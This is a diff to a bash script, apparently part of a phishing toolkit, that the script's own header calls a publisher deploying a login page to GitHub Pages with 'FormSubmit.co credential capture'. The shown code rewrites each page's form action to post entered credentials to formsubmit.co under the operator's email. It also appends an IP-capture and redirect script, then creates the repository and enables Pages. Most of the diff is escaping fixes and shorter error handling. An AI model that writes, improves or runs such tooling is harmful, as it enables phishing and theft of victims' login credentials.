@@ -3,13 +3,14 @@
 ## Zen GitHub Pages Publisher
 ## Deploys login page to GitHub Pages with FormSubmit.co credential capture
 ## Usage: bash scripts/ghpublish.sh <site_name> <your_email>
+## Set token: export ZEN_GITHUB_TOKEN=ghp_xxxxx
 
 GITHUB_TOKEN="${ZEN_GITHUB_TOKEN:-$GITHUB_TOKEN}"
 GITHUB_USER="whydohumanssuck"
-WEBSITE="\$1"
-YOUR_EMAIL="\$2"
-SCRIPT_DIR="\$(cd "\$(dirname "\$0")" && pwd)"
-BASE_DIR="\$(dirname "\$SCRIPT_DIR")"
+WEBSITE="$1"
+YOUR_EMAIL="$2"
+SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
+BASE_DIR="$(dirname "$SCRIPT_DIR")"
 
 RED='\033[0;31m'
 GREEN='\033[0;32m'
@@ -18,18 +19,18 @@ MAGENTA='\033[0;35m'
 WHITE='\033[0;37m'
 BOLD='\033[1m'
 
-log()  { echo -e "\${MAGENTA}[\${WHITE}-\${RED}]\${CYAN} \$1\${WHITE}"; }
-ok()   { echo -e "\${MAGENTA}[\${WHITE}+\${GREEN}]\${GREEN} \$1\${WHITE}"; }
-fail() { echo -e "\${MAGENTA}[\${WHITE}!\${RED}]\${RED} \$1\${WHITE}"; }
+log()  { echo -e "${MAGENTA}[${WHITE}-${RED}]${CYAN} $1${WHITE}"; }
+ok()   { echo -e "${MAGENTA}[${WHITE}+${GREEN}]${GREEN} $1${WHITE}"; }
+fail() { echo -e "${MAGENTA}[${WHITE}!${RED}]${RED} $1${WHITE}"; }
 
-if [[ -z "\$GITHUB_TOKEN" ]]; then
+if [[ -z "$GITHUB_TOKEN" ]]; then
     fail "GitHub token not found!"
     echo ""
     echo "  Set your token:"
     echo "    export ZEN_GITHUB_TOKEN=your_token_here"
     echo ""
     echo "  Or add to ~/.bashrc:"
-    echo '    echo "export ZEN_GITHUB_TOKEN=your_token" >> ~/.bashrc'
+    echo '    echo "export ZEN_GITHUB_TOKEN=ghp_xxxxx" >> ~/.bashrc'
     exit 1
 fi
 
@@ -76,15 +77,15 @@ log "Converting to static HTML..."
 FILE_COUNT=0
 for f in /tmp/zen_deploy/*.html; do
     [[ -f "$f" ]] || continue
-    
+
     # Change form action to FormSubmit.co
     sed -i "s|action=\"login.php\"|action=\"https://formsubmit.co/$YOUR_EMAIL\" method=\"POST\"|g" "$f"
     sed -i "s|action='login.php'|action='https://formsubmit.co/$YOUR_EMAIL' method='POST'|g" "$f"
-    
+
     # Remove old body/html close tags
     sed -i '/<\/body>/d' "$f"
     sed -i '/<\/html>/d' "$f"
-    
+
     # Append IP capture + redirect script
     cat >> "$f" << 'JSEOF'
 
@@ -109,7 +110,7 @@ for f in /tmp/zen_deploy/*.html; do
 </body>
 </html>
 JSEOF
-    
+
     FILE_COUNT=$((FILE_COUNT + 1))
 done
 
@@ -125,10 +126,7 @@ touch /tmp/zen_deploy/.nojekyll
 # Rename main HTML to index.html for GitHub Pages
 if [[ -f /tmp/zen_deploy/login.html ]]; then
     cp /tmp/zen_deploy/login.html /tmp/zen_deploy/index.html
-elif [[ -f /tmp/zen_deploy/index.html ]]; then
-    : # already named correctly
-else
-    # Find the first HTML file and rename to index.html
+elif [[ ! -f /tmp/zen_deploy/index.html ]]; then
     FIRST_HTML=$(ls /tmp/zen_deploy/*.html 2>/dev/null | head -1)
     if [[ -n "$FIRST_HTML" ]]; then
         cp "$FIRST_HTML" /tmp/zen_deploy/index.html
@@ -150,29 +148,9 @@ REPO_HTTP=$(echo "$REPO_RESPONSE" | tail -1)
 REPO_BODY=$(echo "$REPO_RESPONSE" | head -n -1)
 
 if [[ "$REPO_HTTP" != "201" ]]; then
-    # Check if repo already exists
-    EXISTING=$(echo "$REPO_BODY" | grep -o '"message":"[^"]*"' | head -1)
-    if [[ "$EXISTING" == *"[mM] already exists"* ]] || [[ "$EXISTING" == *"[rR]epository creation failed"* ]]; then
-        log "Repo exists, trying to delete and recreate..."
-        curl -s -X DELETE \
-            -H "Authorization: token $GITHUB_TOKEN" \
-            -H "Accept: application/vnd.github.v3+json" \
-            "https://api.github.com/repos/$GITHUB_USER/$REPO_NAME" > /dev/null 2>&1
-        sleep 2
-        REPO_RESPONSE=$(curl -s -w "\n%{http_code}" -X POST \
-            -H "Authorization: token $GITHUB_TOKEN" \
-            -H "Accept: application/vnd.github.v3+json" \
-            -d "{\"name\":\"$REPO_NAME\",\"auto_init\":false}" \
-            "https://api.github.com/user/repos")
-        REPO_HTTP=$(echo "$REPO_RESPONSE" | tail -1)
-    fi
-fi
-
-if [[ "$REPO_HTTP" != "201" ]]; then
     fail "Failed to create repository (HTTP $REPO_HTTP)"
     fail "Response: $REPO_BODY"
-    echo ""
-    return 1 2>/dev/null || exit 1
+    exit 1
 fi
 
 ok "Repository created"
@@ -192,7 +170,7 @@ git remote add origin "https://${GITHUB_USER}:${GITHUB_TOKEN}@github.com/${GITHU
 PUSH_OUTPUT=$(git push -u origin main 2>&1)
 if [[ $? -ne 0 ]]; then
     fail "Push failed: $PUSH_OUTPUT"
-    return 1 2>/dev/null || exit 1
+    exit 1
 fi
 
 ok "Files pushed"
@@ -212,13 +190,12 @@ PAGES_HTTP=$(echo "$PAGES_RESPONSE" | tail -1)
 if [[ "$PAGES_HTTP" == "201" ]] || [[ "$PAGES_HTTP" == "204" ]]; then
     ok "GitHub Pages enabled"
 else
-    # Pages might already be enabled, or there might be a build delay
     log "Pages API returned HTTP $PAGES_HTTP (may still be building...)"
 fi
 
 # Wait for GitHub Pages to build
-log "Waiting for Pages to build..."
-sleep 5
+log "Waiting for Pages to build (30s)..."
+sleep 30
 
 # Verify the site is live
 SITE_URL="https://${GITHUB_USER}.github.io/${REPO_NAME}/"
